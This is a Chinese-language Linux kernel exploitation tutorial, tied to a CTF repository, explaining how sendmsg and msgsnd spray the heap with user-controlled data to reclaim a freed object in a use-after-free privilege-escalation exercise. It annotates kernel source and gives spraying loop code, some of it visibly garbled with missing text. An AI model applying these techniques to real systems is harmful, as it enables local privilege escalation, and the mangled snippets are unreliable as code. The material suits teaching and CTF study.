说明：实验所需的驱动源码、bzImage、cpio文件见[我的github](https://github.com/bsauce/CTF)进行下载。本教程适合对漏洞提权有一定了解的同学阅读，具体可以看看我先知之前的文章，或者[我的简书](https://www.jianshu.com/u/a12c5b882be2)。
# 一、 堆喷函数介绍
在linux内核下进行堆喷射时，首先需要注意喷射的堆块的大小，因为只有大小相近的堆块才保存在相同的cache中。具体的cache块分布如下图：
本文的漏洞例子中uaf_obj对象的大小是84，实际申请时会分配一个96字节的堆块。本例中我们可以申请96大小的k_object对象，并在堆块上任意布置数据，但这样的话就太简单了点，实际漏洞利用中怎么会这么巧就让你控制堆上的数据呢。所以我们需要找到某些用户可调用的函数，它会在内核空间申请指定大小的chunk（本例中我们希望能分配到96字节的块），并把用户的数据拷贝过去。
### （1）sendmsg
    static int ___sys_sendmsg(struct socket *sock, struct user_msghdr __user *msg,
                 struct msghdr *msg_sys, unsigned int flags,
                 struct used_address *used_address,
                 unsigned int allowed_msghdr_flags)
    {
        struct compat_msghdr __user *msg_compat =
            (struct compat_msghdr __user *)msg;
        struct sockaddr_storage address;
        struct iovec iovstack[UIO_FASTIOV], *iov = iovstack;
        unsigned char ctl[sizeof(struct cmsghdr) + 20]
                    __aligned(sizeof(__kernel_size_t)); // 创建44字节的栈缓冲区ctl，20是ipv6_pktinfo结构的大小
        unsigned char *ctl_buf = ctl; // ctl_buf指向栈缓冲区ctl
        int ctl_len;
        ssize_t err;
        msg_sys->msg_name = &address;
        if (MSG_CMSG_COMPAT & flags)
            err = get_compat_msghdr(msg_sys, msg_compat, NULL, &iov);
        else
            err = copy_msghdr_from_user(msg_sys, msg, NULL, &iov); // 用户数据拷贝到msg_sys，只拷贝msghdr消息头部
        if (err msg_controllen > INT_MAX) //如果msg_sys小于INT_MAX，就把ctl_len赋值为用户提供的msg_controllen
            goto out_freeiov;
        flags |= (msg_sys->msg_flags & allowed_msghdr_flags);
        ctl_len = msg_sys->msg_controllen;
        if ((MSG_CMSG_COMPAT & flags) && ctl_len) {
            err =
                cmsghdr_from_user_compat_to_kern(msg_sys, sock->sk, ctl,
                                 sizeof(ctl));
            if (err)
                goto out_freeiov;
            ctl_buf = msg_sys->msg_control;
            ctl_len = msg_sys->msg_controllen;
        } else if (ctl_len) {
            BUILD_BUG_ON(sizeof(struct cmsghdr) !=
                     CMSG_ALIGN(sizeof(struct cmsghdr)));
            if (ctl_len > sizeof(ctl)) {  //注意用户数据的size必须大于44字节
                ctl_buf = sock_kmalloc(sock->sk, ctl_len, GFP_KERNEL);//sock_kmalloc最后会调用kmalloc 分配 ctl_len 大小的堆块
                if (ctl_buf == NULL)
                    goto out_freeiov;
            }
            err = -EFAULT;
            /* 注意，msg_sys->msg_control是用户可控的用户缓冲区；ctl_len是用户可控的长度。  用户数据拷贝到ctl_buf内核空间。
             */
            if (copy_from_user(ctl_buf,
                       (void __user __force *)msg_sys->msg_control,
                       ctl_len))
                goto out_freectl;
            msg_sys->msg_control = ctl_buf;
        }
        msg_sys->msg_flags = flags;
    ...
**结论** ：只要传入size大于44，就能控制kmalloc申请的内核空间的数据。
**数据流** ：
> `msg` \---> `msg_sys` \---> `msg_sys->msg_controllen` \---> `ctl_len`
>
> `msg` \---> `msg_sys->msg_control` \---> `ctl_buf`
**利用流程** ：
    //限制: BUFF_SIZE > 44
    char buff[BUFF_SIZE];
    struct msghdr msg = {0};
    struct sockaddr_in addr = {0};
    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
    addr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    addr.sin_family = AF_INET;
    addr.sin_port = htons(6666);
    // 布置用户空间buff的内容
    msg.msg_control = buff;
    msg.msg_controllen = BUFF_SIZE; 
    msg.msg_name = (caddr_t)&addr;
    msg.msg_namelen = sizeof(addr);
    // 假设此时已经产生释放对象，但指针未清空
    for(int i = 0; i mtype))
            return -EFAULT;
        return do_msgsnd(msqid, mtype, msgp->mtext, msgsz, msgflg);
    }
    // /ipc/msg.c
    static long do_msgsnd(int msqid, long mtype, void __user *mtext,
            size_t msgsz, int msgflg)
    {
        struct msg_queue *msq;
        struct msg_msg *msg;
        int err;
        struct ipc_namespace *ns;
        DEFINE_WAKE_Q(wake_q);
        ns = current->nsproxy->ipc_ns;
        if (msgsz > ns->msg_ctlmax || (long) msgsz next; seg != NULL; seg = seg->next) {
            len -= alen;
            src = (char __user *)src + alen;
            alen = min(len, DATALEN_SEG);
            if (copy_from_user(seg + 1, src, alen)) // copy2
                goto out_err;
        }
        err = security_msg_msg_alloc(msg);
        if (err)
            goto out_err;
        return msg;
    out_err:
        free_msg(msg);
        return ERR_PTR(err);
    }
    // /ipc/msgutil.c
    #define DATALEN_MSG ((size_t)PAGE_SIZE-sizeof(struct msg_msg))
    static struct msg_msg *alloc_msg(size_t len)
    {
        struct msg_msg *msg;
        struct msg_msgseg **pseg;
        size_t alen;
        alen = min(len, DATALEN_MSG);
        msg = kmalloc(sizeof(*msg) + alen, GFP_KERNEL_ACCOUNT); // 先分配了一个msg_msg结构大小
    ...
`msgsnd()`\--->`ksys_msgsnd()`\--->`do_msgsnd()`。
do_msgsnd()根据用户传递的buffer和size参数调用load_msg(mtext,
msgsz)，load_msg()先调用alloc_msg(msgsz)创建一个msg_msg结构体（），然后拷贝用户空间的buffer紧跟msg_msg结构体的后面，相当于给buffer添加了一个头部，因为msg_msg结构体大小等于0x30，因此用户态的buffer大小等于`xx-0x30`。
**结论** ：前0x30字节不可控。数据量越大（本文示例是96字节），发生阻塞可能性越大，120次发送足矣。
**利用流程** ：
    // 只能控制0x30字节以后的内容
    struct {
      long mtype;
      char mtext[BUFF_SIZE];
    }msg;
    memset(msg.mtext, 0x42, BUFF_SIZE-1); // 布置用户空间的内容
    msg.mtext[BUFF_SIZE] = 0;
    int msqid = msgget(IPC_PRIVATE, 0644 | IPC_CREAT);
    msg.mtype = 1; //必须 > 0
    // 假设此时已经产生释放对象，但指针未清空
    for(int i = 0; i arg = arg;
            target->fn = uaf_callback;